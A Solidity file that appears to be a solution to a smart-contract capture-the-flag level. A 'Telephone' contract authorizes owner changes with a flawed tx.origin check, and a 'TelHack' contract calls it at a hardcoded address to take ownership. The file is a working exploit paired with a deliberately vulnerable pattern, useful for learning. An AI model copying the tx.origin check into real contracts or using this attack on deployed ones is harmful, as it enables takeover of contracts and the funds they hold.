// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelHack {
    address origAdress = 0x46588bE99472c5C980Fe0f116e8D37CD801ff871;
    Telephone public myTelephone;

    constructor() {
        myTelephone = Telephone(origAdress);
    }

    function hack() public {
        // msg.sender will be the contract address
        // tx.origin will be the original sender (Metamask public key)
        myTelephone.changeOwner(0x4cEE6B545906e927Ea1f9f2f271f7db7e41328D9);
    }
}
